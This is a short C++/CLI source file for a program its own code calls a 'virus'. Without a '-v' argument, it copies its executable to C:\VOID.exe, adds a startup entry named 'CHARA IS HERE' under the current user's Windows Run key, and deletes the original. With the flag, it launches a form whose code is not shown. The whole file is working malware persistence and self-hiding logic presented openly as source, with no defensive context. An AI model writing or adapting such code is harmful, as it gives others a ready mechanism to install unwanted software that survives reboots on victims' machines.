#include "main.h"

#pragma warning(disable : 4829)

using namespace System;
using namespace System::IO;
using namespace System::Reflection;
using namespace System::Windows::Forms;
using namespace Microsoft::Win32;

[STAThreadAttribute]
void main(array<String^>^ args)
{
	bool virus = false;

	for each (String ^ i in args)
	{
		if (i == "-v" | i == "--virus")
		{
			virus = true;
		}
	}

	for each (String ^ i in args)
	{
		if (i == "-v" || i == "--virus")
		{
			virus = true;
		}
	}

	if (virus == true)
	{
		Application::EnableVisualStyles();
		Application::SetCompatibleTextRenderingDefault(false);
		Application::Run(gcnew xVOID::mainForm());
	}
	else
	{
		File::Copy(Assembly::GetEntryAssembly()->Location, "C:\\VOID.exe");

		RegistryKey^ rk = Registry::CurrentUser->OpenSubKey(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

		rk->SetValue("CHARA IS HERE", "C:\\VOID.exe -v");

		File::Delete(Assembly::GetEntryAssembly()->Location);
	}
}